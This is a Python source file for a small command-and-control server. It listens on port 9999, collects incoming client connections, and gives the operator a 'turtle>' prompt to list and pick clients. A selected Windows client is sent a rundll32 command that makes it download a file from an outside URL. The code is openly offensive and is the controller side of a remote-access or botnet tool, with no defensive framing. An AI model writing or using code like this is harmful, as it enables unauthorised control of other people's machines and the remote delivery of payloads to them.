import socket
import sys
import threading,time


all_connections=[]
all_addresses=[]
host=None
port=None
s=None
def create_socket():
    global host
    global port
    global s
    host=""
    port=9999
    try:
        s=socket.socket()
    except socket.error as e:
        print("Socket creation error: ",e)
create_socket()
def bind_socket():
    global host
    global port
    global s
    try:
        print("Binding the port:",port)
        s.bind((host,port))
        print("Listening...")
        s.listen(5)  # throw error on 5 bad connections
    except socket.error as e:
        print("Binding error: ",e,"\nRetrying...")
        bind_socket()
bind_socket()
def accepting_connections():
    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1)
            print(f"connection: {connection}\naddress: {address}")
            all_connections.append(connection)
            all_addresses.append(address)
        except socket.error as e:
            print("Socket accept error: ", e, "\nRetrying...")

def list_connections():
    n=len(all_connections)
    for i in range(n):
        print(all_connections[i],all_addresses[i])

def get_connection(i):
    try:
        print(all_connections[i],all_addresses[i],"\navailable?")
        c=all_connections[i]
        c.send(str.encode("available?"))
        response=str(c.recv(1024),"utf-8")
        if response=="yes":
            print(response)
            print("downloading a file on that client...")
            c.send(str.encode(
                "rundll32 url.dll,FileProtocolHandler https://mp3.gisher.org/download/1924"
            ))
    except:
        all_connections.pop(i)
        all_addresses.pop(i)

def start_turtle():
    while True:
        cmd=input("turtle> ")
        if cmd=="list":
            list_connections()
        if cmd=="select":
            cmd =int(input("> "))
            get_connection(cmd)
        if cmd=="quit":
            return

t1=threading.Thread(target=accepting_connections)
t2=threading.Thread(target=start_turtle)

t1.start()
t2.start()

for c in all_connections:
    c.close()
del all_connections[:]
del all_addresses[:]